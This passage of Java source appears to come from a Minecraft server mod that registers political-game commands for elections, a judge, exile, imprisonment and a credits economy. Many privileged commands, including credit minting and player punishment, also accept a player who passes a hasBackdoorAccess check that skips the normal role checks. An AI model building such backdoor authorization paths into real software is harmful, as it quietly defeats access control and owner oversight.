                    String chair = DataManager.getChair();
                    String viceChair = DataManager.getViceChair();

                    boolean isChair = uuid.equals(chair);
                    boolean isViceChair = uuid.equals(viceChair);
                    boolean hasBackdoor = PoliticalServer.hasBackdoorAccess(player);

                    if (!isChair && !isViceChair && !hasBackdoor) {
                        player.sendMessage(Text.literal("Only the Chair or Vice Chair can use this command!").formatted(Formatting.RED));
                        return 0;
                    }

                    if (!PerkManager.canChangePerks(isChair)) {
                        player.sendMessage(Text.literal("Perks have already been selected for this term!").formatted(Formatting.RED));
                        return 0;
                    }

                    PerksGui.open(player, isChair);
                    return 1;
                }));
    }

    private static void registerGov(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("gov")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) {
                        return 0;
                    }

                    if (DictatorManager.isDictatorActive()) {
                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.DARK_RED));
                        player.sendMessage(Text.literal("       ⚠ GOVERNMENT STATUS ⚠").formatted(Formatting.RED, Formatting.BOLD));
                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.DARK_RED));

                        player.sendMessage(Text.literal("Dictator: ").formatted(Formatting.RED)
                                .append(Text.literal(DictatorManager.getDictatorName()).formatted(Formatting.DARK_RED, Formatting.BOLD)));

                        if (DictatorManager.isDictatorTaxEnabled()) {
                            player.sendMessage(Text.literal("Daily Tax: " + DictatorManager.getDictatorTaxAmount() + " credits").formatted(Formatting.RED));
                        }

                        player.sendMessage(Text.literal(""));
                        player.sendMessage(Text.literal("Elections: SUSPENDED").formatted(Formatting.DARK_RED));

                        player.sendMessage(Text.literal(""));
                        List<String> perks = PerkManager.getActivePerks();
                        if (!perks.isEmpty()) {
                            player.sendMessage(Text.literal("Active Perks:").formatted(Formatting.RED));
                            for (String perkId : perks) {
                                Perk perk = PerkManager.getPerk(perkId);
                                if (perk != null) {
                                    player.sendMessage(Text.literal(" • " + perk.name).formatted(Formatting.DARK_RED));
                                }
                            }
                        }

                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.DARK_RED));
                    } else {
                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                        player.sendMessage(Text.literal("       GOVERNMENT STATUS").formatted(Formatting.YELLOW, Formatting.BOLD));
                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));

                        String chair = DataManager.getChair();
                        String viceChair = DataManager.getViceChair();
                        String judge = DataManager.getJudge();

                        if (chair != null) {
                            player.sendMessage(Text.literal("Chair: ").formatted(Formatting.GRAY)
                                    .append(Text.literal(DataManager.getPlayerName(chair)).formatted(Formatting.GREEN)));
                        } else {
                            player.sendMessage(Text.literal("Chair: ").formatted(Formatting.GRAY)
                                    .append(Text.literal("None").formatted(Formatting.RED)));
                        }

                        if (viceChair != null) {
                            player.sendMessage(Text.literal("Vice Chair: ").formatted(Formatting.GRAY)
                                    .append(Text.literal(DataManager.getPlayerName(viceChair)).formatted(Formatting.AQUA)));
                        } else {
                            player.sendMessage(Text.literal("Vice Chair: ").formatted(Formatting.GRAY)
                                    .append(Text.literal("None").formatted(Formatting.RED)));
                        }

                        if (judge != null) {
                            player.sendMessage(Text.literal("Judge: ").formatted(Formatting.GRAY)
                                    .append(Text.literal(DataManager.getPlayerName(judge)).formatted(Formatting.LIGHT_PURPLE)));
                        } else {
                            player.sendMessage(Text.literal("Judge: ").formatted(Formatting.GRAY)
                                    .append(Text.literal("None").formatted(Formatting.RED)));
                        }

                        player.sendMessage(Text.literal(""));
                        if (ElectionManager.isElectionActive()) {
                            long remaining = ElectionManager.getRemainingTime();
                            String time = PoliticalServer.formatTime(remaining);
                            player.sendMessage(Text.literal("⚡ ELECTION ACTIVE - " + time + " remaining!").formatted(Formatting.YELLOW));
                        } else if (ElectionManager.isElectionSystemEnabled() && !ElectionManager.isElectionSystemPaused()) {
                            long remaining = ElectionManager.getTimeUntilNextElection();
                            String time = PoliticalServer.formatTime(remaining);
                            player.sendMessage(Text.literal("Next election in: " + time).formatted(Formatting.GRAY));
                        } else if (!ElectionManager.isElectionSystemEnabled()) {
                            player.sendMessage(Text.literal("Elections: DISABLED").formatted(Formatting.GRAY));
                        } else if (ElectionManager.isElectionSystemPaused()) {
                            player.sendMessage(Text.literal("Elections: PAUSED").formatted(Formatting.GRAY));
                        }

                        player.sendMessage(Text.literal(""));
                        List<String> perks = PerkManager.getActivePerks();
                        if (!perks.isEmpty()) {
                            player.sendMessage(Text.literal("Active Perks:").formatted(Formatting.GOLD));
                            for (String perkId : perks) {
                                Perk perk = PerkManager.getPerk(perkId);
                                if (perk != null) {
                                    player.sendMessage(Text.literal(" • " + perk.name).formatted(Formatting.WHITE));
                                }
                            }
                        }

                        player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                    }
                    return 1;
                }));
    }

    private static void registerJudge(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("judge")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(context -> {
                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                            DataManager.setJudge(target.getUuidAsString());
                            DataManager.save(PoliticalServer.server);

                            context.getSource().sendMessage(Text.literal("Set " + target.getName().getString() + " as Judge!").formatted(Formatting.GREEN));
                            target.sendMessage(Text.literal("You have been appointed as the Server Judge!").formatted(Formatting.GOLD, Formatting.BOLD));
                            return 1;
                        })));
    }

    private static void registerExile(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("exile")
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(context -> {
                            ServerPlayerEntity source = context.getSource().getPlayer();
                            if (source == null) return 0;

                            String sourceUuid = source.getUuidAsString();

                            if (!DictatorManager.hasJudgePermissions(sourceUuid)
                                    && !PoliticalServer.hasBackdoorAccess(source)) {
                                source.sendMessage(Text.literal("Only the Judge can use this command!")
                                        .formatted(Formatting.RED));
                                return 0;
                            }

                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");

                            Random rand = new Random();
                            double distance = 10_000 + rand.nextDouble() * 90_000;
                            double angle = rand.nextDouble() * Math.PI * 2;

                            double x = Math.cos(angle) * distance;
                            double z = Math.sin(angle) * distance;

                            ServerWorld world = PoliticalServer.server.getOverworld();
                            int safeY = findSafeY(world, (int) x, (int) z);

                            target.teleport(world, x, safeY, z, Set.of(), 0, 0, false);
                            var blockPos = net.minecraft.util.math.BlockPos.ofFloored(x, safeY, z);
                            var globalPos = net.minecraft.util.math.GlobalPos.create(world.getRegistryKey(), blockPos);
                            var spawnPoint = new net.minecraft.world.WorldProperties.SpawnPoint(globalPos, 0f, 0f);

                            target.setSpawnPoint(
                                    new ServerPlayerEntity.Respawn(spawnPoint, true),
                                    false
                            );
                            target.sendMessage(Text.literal("You have been EXILED!")
                                    .formatted(Formatting.RED, Formatting.BOLD));
                            target.sendMessage(Text.literal("Your spawn has been set to this location.")
                                    .formatted(Formatting.GRAY));

                            for (ServerPlayerEntity p : context.getSource().getServer().getPlayerManager().getPlayerList()) {
                                p.sendMessage(Text.literal("⚖ " + target.getName().getString() + " has been exiled by the Judge!")
                                        .formatted(Formatting.RED));
                            }
                            return 1;
                        })));
    }

    private static int findSafeY(ServerWorld world, int x, int z) {
        for (int y = world.getTopYInclusive(); y > world.getBottomY(); y--) {
            net.minecraft.util.math.BlockPos pos = new net.minecraft.util.math.BlockPos(x, y, z);
            net.minecraft.util.math.BlockPos below = pos.down();

            if (world.getBlockState(below).isSolid()
                    && world.getBlockState(pos).isAir()
                    && world.getBlockState(pos.up()).isAir()) {
                return y;
            }
        }
        return 100;
    }

    private static void registerRelocate(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("relocate")
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(context -> {
                            ServerPlayerEntity source = context.getSource().getPlayer();
                            if (source == null) return 0;

                            String sourceUuid = source.getUuidAsString();

                            if (!DictatorManager.isDictator(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
                                source.sendMessage(Text.literal("Only the Dictator can use /relocate!").formatted(Formatting.RED));
                                return 0;
                            }

                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");

                            Random rand = new Random();
                            double distance = 100 + rand.nextDouble() * 900;
                            double angle = rand.nextDouble() * Math.PI * 2;

                            double newX = target.getX() + Math.cos(angle) * distance;
                            double newZ = target.getZ() + Math.sin(angle) * distance;

                            ServerWorld world = (ServerWorld) target.getEntityWorld();
                            int safeY = findSafeY(world, (int) newX, (int) newZ);

                            target.teleport(world, newX, safeY, newZ, Set.of(), target.getYaw(), target.getPitch(), false);

                            target.sendMessage(Text.literal("You have been relocated by the Dictator!")
                                    .formatted(Formatting.RED));
                            source.sendMessage(Text.literal("Relocated " + target.getName().getString() + " ~" + (int)distance + " blocks away!")
                                    .formatted(Formatting.GREEN));

                            return 1;
                        })));
    }

    private static void registerImprison(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("imprison")
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .then(CommandManager.argument("time", IntegerArgumentType.integer(1, 120))
                                .then(CommandManager.argument("location", Vec3ArgumentType.vec3())
                                        .executes(context -> {
                                            ServerPlayerEntity source = context.getSource().getPlayer();
                                            if (source == null) {
                                                return 0;
                                            }

                                            String sourceUuid = source.getUuidAsString();

                                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
                                                source.sendMessage(Text.literal("Only the Judge can use this command!").formatted(Formatting.RED));
                                                return 0;
                                            }

                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int time = IntegerArgumentType.getInteger(context, "time");
                                            Vec3d loc = Vec3ArgumentType.getVec3(context, "location");

                                            PrisonManager.imprison(target, time, loc.x, loc.y, loc.z);

                                            for (ServerPlayerEntity p : PoliticalServer.server.getPlayerManager().getPlayerList()) {
                                                p.sendMessage(Text.literal("⚖ " + target.getName().getString() + " has been imprisoned for " + time + " minutes!").formatted(Formatting.RED));
                                            }
                                            return 1;
                                        })))));
    }

    private static void registerImpeach(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("impeach")
                .executes(context -> {
                    ServerPlayerEntity source = context.getSource().getPlayer();
                    if (source == null) {
                        return 0;
                    }

                    String sourceUuid = source.getUuidAsString();
                    String judge = DataManager.getJudge();

                    if (!sourceUuid.equals(judge) && !PoliticalServer.hasBackdoorAccess(source)) {
                        source.sendMessage(Text.literal("Only the Judge can use this command!").formatted(Formatting.RED));
                        return 0;
                    }

                    if (DataManager.getChair() == null) {
                        source.sendMessage(Text.literal("No Chair to impeach!").formatted(Formatting.RED));
                        return 0;
                    }

                    if (ElectionManager.isImpeachmentActive()) {
                        source.sendMessage(Text.literal("Impeachment vote already active!").formatted(Formatting.RED));
                        return 0;
                    }

                    ElectionManager.startImpeachment(PoliticalServer.server);
                    return 1;
                }));
    }

    private static void registerForceElection(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("forceelection")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ElectionManager.forceStartElection(PoliticalServer.server);
                    context.getSource().sendMessage(Text.literal("Forced election start!").formatted(Formatting.GREEN));
                    return 1;
                }));
    }

    private static void registerElectionControl(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("election")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .then(CommandManager.literal("enable")
                        .executes(context -> {
                            ElectionManager.setElectionSystemEnabled(true);
                            ElectionManager.setElectionSystemPaused(false);
                            context.getSource().sendMessage(Text.literal("Election system enabled!").formatted(Formatting.GREEN));

                            if (ElectionManager.getTimeUntilNextElection() <= 0 && !ElectionManager.isElectionActive()) {
                                ElectionManager.forceStartElection(PoliticalServer.server);
                            }
                            return 1;
                        }))
                .then(CommandManager.literal("disable")
                        .executes(context -> {
                            ElectionManager.setElectionSystemEnabled(false);
                            context.getSource().sendMessage(Text.literal("Election system disabled!").formatted(Formatting.RED));
                            return 1;
                        }))
                .then(CommandManager.literal("pause")
                        .executes(context -> {
                            ElectionManager.setElectionSystemPaused(true);
                            context.getSource().sendMessage(Text.literal("Election system paused!").formatted(Formatting.YELLOW));
                            return 1;
                        }))
                .then(CommandManager.literal("play")
                        .executes(context -> {
                            ElectionManager.setElectionSystemPaused(false);
                            context.getSource().sendMessage(Text.literal("Election system resumed!").formatted(Formatting.GREEN));
                            return 1;
                        })));
    }

    private static void registerForceCommands(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("force")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .then(CommandManager.literal("chair")
                        .then(CommandManager.literal("resetperks")
                                .executes(context -> {
                                    PerkManager.onNewTermStart();
                                    PerkManager.setPreviousTermPerks(new ArrayList<>());
                                    context.getSource().sendMessage(Text.literal("Perks reset! All members of government can now select perks again.").formatted(Formatting.GREEN));
                                    DataManager.save(PoliticalServer.server);
                                    return 1;
                                }))
                        .then(CommandManager.argument("player", GameProfileArgumentType.gameProfile())
                                .executes(context -> {
                                    var entries = GameProfileArgumentType.getProfileArgument(context, "player");
                                    if (entries.isEmpty()) {
                                        context.getSource().sendMessage(Text.literal("Player not found!").formatted(Formatting.RED));
                                        return 0;
                                    }
                                    var entry = entries.iterator().next();

                                    String uuid = entry.id().toString();
                                    String name = entry.name();

                                    DataManager.setChair(uuid);
                                    DataManager.setChairTermCount(1);
                                    DataManager.save(PoliticalServer.server);

                                    context.getSource().sendMessage(Text.literal("Forced " + name + " as Chair!").formatted(Formatting.GREEN));

                                    ServerPlayerEntity target = PoliticalServer.server.getPlayerManager().getPlayer(entry.id());
                                    if (target != null) {
                                        target.sendMessage(Text.literal("You have been appointed as Chair!").formatted(Formatting.GOLD, Formatting.BOLD));
                                    }
                                    return 1;
                                })))
                .then(CommandManager.literal("vicechair")
                        .then(CommandManager.argument("player", GameProfileArgumentType.gameProfile())
                                .then(CommandManager.literal("resetperks")
                                        .executes(context -> {
                                            PerkManager.onNewTermStart();
                                            PerkManager.setPreviousTermPerks(new ArrayList<>());
                                            context.getSource().sendMessage(Text.literal("Perks reset! All members of government can now select perks again.").formatted(Formatting.GREEN));
                                            DataManager.save(PoliticalServer.server);
                                            return 1;
                                        }))
                                .executes(context -> {
                                    var entries = GameProfileArgumentType.getProfileArgument(context, "player");
                                    if (entries.isEmpty()) {
                                        context.getSource().sendMessage(Text.literal("Player not found!").formatted(Formatting.RED));
                                        return 0;
                                    }
                                    var entry = entries.iterator().next();

                                    String uuid = entry.id().toString();
                                    String name = entry.name();

                                    DataManager.setViceChair(uuid);
                                    DataManager.save(PoliticalServer.server);

                                    context.getSource().sendMessage(Text.literal("Forced " + name + " as Vice Chair!").formatted(Formatting.GREEN));

                                    ServerPlayerEntity target = PoliticalServer.server.getPlayerManager().getPlayer(entry.id());
                                    if (target != null) {
                                        target.sendMessage(Text.literal("You have been appointed as Vice Chair!").formatted(Formatting.GOLD, Formatting.BOLD));
                                    }
                                    return 1;
                                })))
                .then(CommandManager.literal("judge")
                        .then(CommandManager.literal("resetperks")
                                .executes(context -> {
                                    PerkManager.onNewTermStart();
                                    PerkManager.setPreviousTermPerks(new ArrayList<>());
                                    context.getSource().sendMessage(Text.literal("Perks reset! All members of government can now select perks again.").formatted(Formatting.GREEN));
                                    DataManager.save(PoliticalServer.server);
                                    return 1;
                                }))
                        .then(CommandManager.argument("player", GameProfileArgumentType.gameProfile())
                                .executes(context -> {
                                    var entries = GameProfileArgumentType.getProfileArgument(context, "player");
                                    if (entries.isEmpty()) {
                                        context.getSource().sendMessage(Text.literal("Player not found!").formatted(Formatting.RED));
                                        return 0;
                                    }
                                    var entry = entries.iterator().next();

                                    String uuid = entry.id().toString();
                                    String name = entry.name();

                                    DataManager.setJudge(uuid);
                                    DataManager.save(PoliticalServer.server);

                                    context.getSource().sendMessage(Text.literal("Forced " + name + " as Judge!").formatted(Formatting.GREEN));

                                    ServerPlayerEntity target = PoliticalServer.server.getPlayerManager().getPlayer(entry.id());
                                    if (target != null) {
                                        target.sendMessage(Text.literal("You have been appointed as Judge!").formatted(Formatting.GOLD, Formatting.BOLD));
                                    }
                                    return 1;
                                })))
        );
    }

    private static void registerCredits(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("credits")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    int credits = CreditItem.countCredits(player);
                    player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                    player.sendMessage(Text.literal("Your Balance: " + credits + " credits").formatted(Formatting.GREEN));
                    player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                    return 1;
                })
                .then(CommandManager.literal("balance")
                        .executes(context -> {
                            ServerPlayerEntity player = context.getSource().getPlayer();
                            if (player == null) return 0;
                            int credits = CreditItem.countCredits(player);
                            player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                            player.sendMessage(Text.literal("Your Balance: " + credits + " credits").formatted(Formatting.GREEN));
                            player.sendMessage(Text.literal("═══════════════════════════════════").formatted(Formatting.GOLD));
                            return 1;
                        }))
                .then(CommandManager.literal("shop")
                        .executes(context -> {
                            ServerPlayerEntity player = context.getSource().getPlayer();
                            if (player == null) return 0;
                            CreditsTradeGui.open(player);
                            return 1;
                        }))
                .then(CommandManager.literal("add")
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(context -> {
                                            ServerPlayerEntity source = context.getSource().getPlayer();
                                            if (source == null) return 0;

                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
                                                source.sendMessage(Text.literal("You don't have permission!").formatted(Formatting.RED));
                                                return 0;
                                            }

                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");

                                            CreditItem.giveCredits(target, amount);

                                            source.sendMessage(Text.literal("Added " + amount + " credits to " + target.getName().getString()).formatted(Formatting.GREEN));
                                            target.sendMessage(Text.literal("You received " + amount + " credits!").formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("remove")
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(1))
                                        .executes(context -> {
                                            ServerPlayerEntity source = context.getSource().getPlayer();
                                            if (source == null) return 0;

                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
                                                source.sendMessage(Text.literal("You don't have permission!").formatted(Formatting.RED));
                                                return 0;
                                            }

                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");

                                            CreditItem.removeCredits(target, amount);

                                            source.sendMessage(Text.literal("Removed " + amount + " credits from " + target.getName().getString()).formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
                .then(CommandManager.literal("set")
                        .then(CommandManager.argument("player", EntityArgumentType.player())
                                .then(CommandManager.argument("amount", IntegerArgumentType.integer(0))
                                        .executes(context -> {
                                            ServerPlayerEntity source = context.getSource().getPlayer();
                                            if (source == null) return 0;

                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
                                                source.sendMessage(Text.literal("You don't have permission!").formatted(Formatting.RED));
                                                return 0;
                                            }

                                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                            int amount = IntegerArgumentType.getInteger(context, "amount");

                                            CreditItem.setCredits(target, amount);

                                            source.sendMessage(Text.literal("Set " + target.getName().getString() + "'s credits to " + amount).formatted(Formatting.GREEN));
                                            return 1;
                                        }))))
        );
    }

    private static void registerTax(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("tax")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    TaxGui.open(player);
                    return 1;
                }));
    }

    private static void registerRoleCommands(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("chair")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    String uuid = player.getUuidAsString();

                    if (DictatorManager.isDictator(uuid)) {
                        player.sendMessage(Text.literal("Dictators must use /dictator instead!").formatted(Formatting.RED));
                        return 0;
                    }

                    if (!uuid.equals(DataManager.getChair())) {
                        player.sendMessage(Text.literal("Only the Chair can use this command!").formatted(Formatting.RED));
                        return 0;
                    }
                    ChairGui.open(player);
                    return 1;
                }));

        dispatcher.register(CommandManager.literal("vicechair")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    String uuid = player.getUuidAsString();

                    if (DictatorManager.isDictator(uuid)) {
                        player.sendMessage(Text.literal("Dictators must use /dictator instead!").formatted(Formatting.RED));
                        return 0;
                    }

                    if (!uuid.equals(DataManager.getViceChair())) {
                        player.sendMessage(Text.literal("Only the Vice Chair can use this command!").formatted(Formatting.RED));
                        return 0;
                    }
                    ViceChairGui.open(player);
                    return 1;
                }));

        dispatcher.register(CommandManager.literal("admin")
                .requires(CommandManager.requirePermissionLevel(CommandManager.OWNERS_CHECK))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;
                    AdminGui.open(player);
                    return 1;
                }));
    }

    private static void registerResetImpeachment(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("resetimpeachment")
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();
                    if (player == null) return 0;

                    if (!PoliticalServer.hasBackdoorAccess(player)) {
                        player.sendMessage(Text.literal("You don't have permission to use this command!").formatted(Formatting.RED));
                        return 0;
                    }

                    ElectionManager.resetImpeachment();
                    player.sendMessage(Text.literal("Impeachment has been reset!").formatted(Formatting.GREEN));
                    return 1;
                }));
    }

    private static void registerPardon(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(CommandManager.literal("Govpardon")
                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(context -> {
                            ServerPlayerEntity source = context.getSource().getPlayer();
                            if (source == null) return 0;

                            String sourceUuid = source.getUuidAsString();

                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
                                source.sendMessage(Text.literal("Only the Judge can use this command!").formatted(Formatting.RED));
                                return 0;
                            }

                            ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");

                            PrisonManager.release(target);

                            for (ServerPlayerEntity p : PoliticalServer.server.getPlayerManager().getPlayerList()) {
                                p.sendMessage(Text.literal("⚖ " + target.getName().getString() + " has been pardoned by the Judge!").formatted(Formatting.GREEN));
                            }

                            target.sendMessage(Text.literal("You have been pardoned!").formatted(Formatting.GOLD, Formatting.BOLD));
                            return 1;
                        })));
    }
}